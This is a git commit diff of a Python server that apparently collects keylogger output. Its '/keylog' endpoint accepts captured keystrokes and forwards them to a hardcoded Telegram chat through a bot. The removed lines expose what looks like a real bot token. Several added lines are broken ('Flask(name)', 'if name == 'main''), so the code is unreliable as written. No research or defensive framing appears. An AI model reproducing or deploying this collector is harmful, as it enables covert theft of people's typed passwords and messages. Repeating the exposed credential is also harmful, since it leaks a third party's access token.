b14462deb1feb5a8afc2b5f5e12086feed2517af
redmeet288 <154670406+redmeet288@users.noreply.github.com>
2025-07-02 14:17:33 +0200

    server.py

--- server.py
+++ server.py
@@ -1,21 +1,43 @@
 from flask import Flask, request
-from aiogram import Bot
+from aiogram import Bot, Dispatcher
 from aiogram.enums import ParseMode
 from aiogram.client.default import DefaultBotProperties
+from aiogram.fsm.storage.memory import MemoryStorage
+import threading
 import asyncio
 
-TOKEN = "6904720328:AAHdFOlcIoO1r_AaF9JtU0bONBs0Yn3NiZM"
+TOKEN = "token"
 CHAT_ID = 1497603032
 
-app = Flask(__name__)
+app = Flask(name)
+
+
+aiogram_loop = asyncio.new_event_loop()
+
 bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
+dp = Dispatcher(storage=MemoryStorage())
 
 @app.route('/keylog', methods=['POST'])
 def keylog():
     data = request.data.decode('utf-8')
-    print(f"Получено: {data}")
-    asyncio.run(bot.send_message(chat_id=CHAT_ID, text=data))
+    print(f"Полученная строка: {data}")
+
+    asyncio.run_coroutine_threadsafe(
+        bot.send_message(chat_id=CHAT_ID, text=data), aiogram_loop
+    )
     return 'OK'
 
-if __name__ == '__main__':
+def run_flask():
     app.run(host='0.0.0.0', port=5000)
+
+async def main():
+
+    await dp.start_polling(bot)
+
+if name == 'main':
+
+    flask_thread = threading.Thread(target=run_flask)
+    flask_thread.start()
+
+    asyncio.set_event_loop(aiogram_loop)
+    aiogram_loop.run_until_complete(main())
